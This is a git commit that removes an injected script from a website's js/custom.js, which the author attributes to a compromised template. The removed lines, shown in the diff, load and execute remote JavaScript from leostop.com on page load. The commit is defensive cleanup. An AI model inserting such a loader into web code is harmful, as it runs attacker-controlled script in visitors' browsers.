b8df586d5912fdabdda3de67947e672867a17626
jiankimr <jiankimr@gmail.com>
2025-12-06 18:08:10 +0900

    security: remove malicious tracking script from custom.js
    - Removed leostop.com tracking script injection
    - This was likely from a compromised template

--- js/custom.js
+++ js/custom.js
@@ -56,7 +56,6 @@ $(function () {
 	});
 
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 	/* NiceSelect
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
@@ -307,7 +306,6 @@ $(function () {
 		}]
 	});
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 	/* News Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
